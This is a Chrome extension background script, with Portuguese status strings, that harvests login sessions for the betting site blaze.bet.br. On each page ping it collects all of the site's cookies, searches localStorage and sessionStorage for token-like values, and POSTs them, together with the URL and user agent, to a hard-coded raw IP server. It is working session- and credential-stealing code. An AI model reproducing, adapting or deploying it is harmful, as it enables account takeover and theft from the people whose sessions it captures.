const SERVER_URL = 'http://45.231.133.221:3000/api/blaze/extension-login';
let lastPostTs = 0;

const findToken = (pageData, cookies) => {
  const storageValues = [
    ...(pageData?.localStorage ? Object.values(pageData.localStorage) : []),
    ...(pageData?.sessionStorage ? Object.values(pageData.sessionStorage) : [])
  ].filter((v) => typeof v === 'string');

  const fromStorage = storageValues.find((v) => v && v.length > 20 && v.toLowerCase().includes('token'));
  if (fromStorage) return fromStorage;

  const tokenCookie = cookies.find((c) => c.name.toLowerCase().includes('token'));
  if (tokenCookie) return tokenCookie.value;

  return null;
};

const buildCookieHeader = (cookies) =>
  cookies.map((c) => `${c.name}=${c.value}`).join('; ');

const persistStatus = async ({ status, token, cookies }) => {
  await chrome.storage.local.set({
    status: status || 'Aguardando',
    token: token || '(token não encontrado)',
    cookies: cookies || '(sem cookies)'
  });
};

const sendToServer = async (payload) => {
  const now = Date.now();
  if (now - lastPostTs < 3000) {
    // Evitar flood
    return;
  }
  lastPostTs = now;

  await fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
};

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg?.type === 'PAGE_PING') {
    (async () => {
      try {
        const cookies = await chrome.cookies.getAll({ domain: 'blaze.bet.br' });
        const cookieHeader = buildCookieHeader(cookies);
        const token = findToken(msg.data, cookies);

        const payload = {
          source: 'extension',
          url: msg.data?.url,
          accessToken: token,
          cookies,
          cookieHeader,
          userAgent: navigator.userAgent,
          timestamp: Date.now()
        };

        await persistStatus({ status: 'Conectado', token, cookies: cookieHeader });
        await sendToServer(payload);
      } catch (error) {
        await persistStatus({ status: 'Erro ao enviar', token: null, cookies: null });
        console.error('[Blaze Extension] Erro ao enviar dados:', error);
      }
    })();

    sendResponse({ ok: true });
    return true;
  }
});

